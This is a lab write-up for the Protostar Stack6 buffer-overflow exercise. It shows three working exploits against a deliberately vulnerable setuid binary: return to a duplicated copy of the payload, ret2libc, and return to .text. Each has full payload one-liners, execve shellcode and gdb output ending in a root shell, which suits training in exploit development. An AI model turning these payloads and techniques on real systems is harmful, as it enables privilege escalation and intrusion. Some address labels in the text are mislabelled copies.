# Protostar - Stack6
* Getting started
    
    Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
    The levels to be exploited can be found in the /opt/protostar/bin directory.
    For debugging the final levels, you can log in as root with password “godmode” (without the quotes)


* Core Files

    README! The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. This means that instead of the general ./core file you get, it will be in a different directory and different file name.


## __Stack6__
* About
  Stack6 looks at what happens when you have restrictions on the return address.

  This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.

  It is strongly suggested you experiment with multiple ways of getting your code to execute here.

  This level is at /opt/protostar/bin/stack6

* Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();



}

```

  After checking the code I found that the code prevent me to return to address began with 0xbfXXXXXX so I had to return to another address.

  First, we have to see what is the exact position of EIP by using pattern_create.rb
```
root@BOEING:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```
(gdb) run
Starting program: /opt/protostar/bin/stack6 
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) 
```

```
root@BOEING:~#  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q  0x37634136
[*] Exact match at offset 80
```

  I had 80-byte buffer. 

  This challenge can be accomplished by many ways and I'll try some methods.

## 1. Duplicate of the payload
  Duplicate payload technique is a technique we could find our shellcode or input store in another place. After checking the stack I found that our payload stored in another location which the location address did not begin with 0xbfXXXXXX.
```
(gdb) disassemble main
Dump of assembler code for function main:
0x080484fa <main+0>:    push   ebp
0x080484fb <main+1>:    mov    ebp,esp
0x080484fd <main+3>:    and    esp,0xfffffff0
0x08048500 <main+6>:    call   0x8048484 <getpath>
0x08048505 <main+11>:   mov    esp,ebp
0x08048507 <main+13>:   pop    ebp
0x08048508 <main+14>:   ret    
End of assembler dump.
(gdb) b *main+13
Note: breakpoint 1 also set at pc 0x8048507.
Breakpoint 2 at 0x8048507: file stack6/stack6.c, line 31.
(gdb) run 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack6 
input path please: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info proc map
process 2888
cmdline = '/opt/protostar/bin/stack6'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fde000 0xb7fe2000     0x4000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) find  0xb7feb000, +99999999, 0x41414141
warning: Unable to access target memory at 0xb7ffe883, halting search.
Pattern not found.
(gdb) find  0xb7fff000, +99999999, 0x41414141
warning: Unable to access target memory at 0xb7fff000, halting search.
Pattern not found.
(gdb) find  0xb7fe3000, +99999999, 0x41414141
warning: Unable to access target memory at 0xb7ffe583, halting search.
Pattern not found.
(gdb) find  0xb7fe3000, +99999999, 0x41414141
warning: Unable to access target memory at 0xb7ffe583, halting search.
Pattern not found.
(gdb) find  0xb7fe2000, +99999999, 0x41414141
warning: Unable to access target memory at 0xb7ffd583, halting search.
Pattern not found.
(gdb) find  0xb7fde000, +99999999, 0x41414141
0xb7fde000
0xb7fde001
0xb7fde002
0xb7fde003
0xb7fde004
0xb7fde005
.
.
.
.
---Type <return> to continue, or q <return> to quit---
```

Let's check that location 0xb7fde000
```
(gdb) x/40xw 0xb7fde000
0xb7fde000:     0x41414141      0x41414141      0x41414141      0x41414141
0xb7fde010:     0x41414141      0x41414141      0x41414141      0x41414141
0xb7fde020:     0x41414141      0x41414141      0x41414141      0x41414141
0xb7fde030:     0x41414141      0x41414141      0x41414141      0x41414141
0xb7fde040:     0x41414141      0x41414141      0x41414141      0x41414141
0xb7fde050:     0x42424242      0x0000000a      0x00000000      0x00000000
0xb7fde060:     0x00000000      0x00000000      0x00000000      0x00000000
0xb7fde070:     0x00000000      0x00000000      0x00000000      0x00000000
0xb7fde080:     0x00000000      0x00000000      0x00000000      0x00000000
0xb7fde090:     0x00000000      0x00000000      0x00000000      0x00000000
```

So we may try to point return address to 0xb7fde000. I'll use the same shellcode as the previous level.
```
python -c 'print("\x90"*(80-49) + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42" + "\x00\xe0\xfd\xb7")' > /tmp/exploit6
```

And got the shell.
```
user@protostar:~$ cat /tmp/exploit6 - | /opt/protostar/bin/stack6
input path please: got path whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

```

## 2. Ret2libc
  For this technique I had to point return address to an address of a function in libc which won't begin with 0xbf for example, in this case I will point to System() function, and make that function excute my shell command.
  1. Find an address of System() function in libc

```
(gdb) info proc map
process 2915
cmdline = '/opt/protostar/bin/stack6'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fde000 0xb7fe2000     0x4000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) shell readelf -s "/lib/libc-2.11.2.so" | grep system
   238: 000f29d0    66 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   606: 00038fb0   125 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1399: 00038fb0   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
(gdb) 
```
  Since the libc base address was 0xb7e97000, we got the address of System() function: 0xb7e97000 + 0x00038fb0 = 0xB7ECFFB0

  2. Find an address of Exit() function in libc
```
(gdb) shell readelf -s "/lib/libc-2.11.2.so" | grep exit
   107: 0002f520    60 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
   136: 0002f0c0    47 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   542: 00097154    19 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
   596: 000f3880    67 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
   630: 0002f4f0    47 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
   845: 0002f330    59 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
  1012: 001053b0    59 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
  1339: 00141164     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
  1448: 000d89e0    70 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
  2025: 001410cc     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
  2174: 0002f0f0    88 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
  2318: 000de1c0     5 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
```
  Since the libc base address was 0xb7e97000, we got the address of System() function: 0xb7e97000 + 0x0002f0c0 = 0xB7EC60C0

  3. Prepare an address of my shell command

  For this step, we just need the string **/bin/sh** in somewhere so I'll try to find them it libc.
```
(gdb) shell strings -t x "/lib/libc-2.11.2.so" | grep "/bin/sh"
 11f3bf /bin/sh
```
  Since the libc base address was 0xb7e97000, we got the address of System() function: 0xb7e97000 + 0x0011f3bf = 0xB7FB63BF

  4. Prepare final paylaod
  > {NOP or Some Buffer}(80) + {Address of System()}(4) + {Address Exit()}(4) + {Address of string "/bin/sh"}(4)
```
python -c 'print("\x90"*(80) + "\xb0\xff\xec\xb7" + "\xC0\x60\xEC\xB7" + "\xBF\x63\xFB\xB7")' > /tmp/exploit6_ret2libc
```

  Got the shell.
```
user@protostar:~$ python -c 'print("\x90"*(80) + "\xb0\xff\xec\xb7" + "\xC0\x60\xEC\xB7" + "\xBF\x63\xFB\xB7")' > /tmp/exploit6_ret2libc
user@protostar:~$ cat /tmp/exploit6_ret2libc - | /opt/protostar/bin/stack6
input path please: got path 

                             id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```


## 3. Return to .Text
  .text is just a section of assembly code. We will now return to return instruction of getpath() function 
  1. Find the address of return instruction of getpath() function
```
(gdb) disassemble getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   %ebp
0x08048485 <getpath+1>: mov    %esp,%ebp
0x08048487 <getpath+3>: sub    $0x68,%esp
0x0804848a <getpath+6>: mov    $0x80485d0,%eax
0x0804848f <getpath+11>:        mov    %eax,(%esp)
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    0x8049720,%eax
0x0804849c <getpath+24>:        mov    %eax,(%esp)
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    -0x4c(%ebp),%eax
0x080484a7 <getpath+35>:        mov    %eax,(%esp)
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    0x4(%ebp),%eax
0x080484b2 <getpath+46>:        mov    %eax,-0xc(%ebp)
0x080484b5 <getpath+49>:        mov    -0xc(%ebp),%eax
0x080484b8 <getpath+52>:        and    $0xbf000000,%eax
0x080484bd <getpath+57>:        cmp    $0xbf000000,%eax
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    $0x80485e4,%eax
0x080484c9 <getpath+69>:        mov    -0xc(%ebp),%edx
0x080484cc <getpath+72>:        mov    %edx,0x4(%esp)
0x080484d0 <getpath+76>:        mov    %eax,(%esp)
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        movl   $0x1,(%esp)
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    $0x80485f0,%eax
0x080484e9 <getpath+101>:       lea    -0x4c(%ebp),%edx
0x080484ec <getpath+104>:       mov    %edx,0x4(%esp)
0x080484f0 <getpath+108>:       mov    %eax,(%esp)
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave  
0x080484f9 <getpath+117>:       ret    
End of assembler dump.
(gdb) 
```
  The address of return instruction: 0x080484f9

  2. Find the address of stack
```
(gdb) x/40xw $esp
0xbffff7d4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7e4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7f4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff804:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff814:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff824:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff834:     0x315e1aeb      0x074688c0      0x5e891e8d      0x0c468908
0xbffff844:     0xf3890bb0      0x8d084e8d      0x80cd0c56      0xffffe1e8
0xbffff854:     0x69622fff      0x68732f6e      0x4141414a      0x42424241
0xbffff864:     0x00000042      0xbffff884      0x08048520      0x08048510
```
  The address of return instruction: 0xbffff7d4

  3. Prepare final payload
  > {NOP or Some Buffer}(80) + {Address of return instruction}(4) + {Address of stack}(4) + {NOPs sled}(100) + {Shellcode} 
```
python -c 'print("\x90"*(80) + "\xf9\x84\x04\x08" + "\xd4\xf7\xff\xbf" +  "\x90"*100 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42")' > /tmp/exploit6_ret2text
```

Got the shell.
```
user@protostar:~$ python -c 'print("\x90"*(80) + "\xf9\x84\x04\x08" + "\xd4\xf7\xff\xbf" +  "\x90"*100 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42")' > /tmp/exploit6_ret2text
user@protostar:~$ cat /tmp/exploit6_ret2text - | /opt/protostar/bin/stack6
input path please: got path in/shJAAAABBBB
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root

```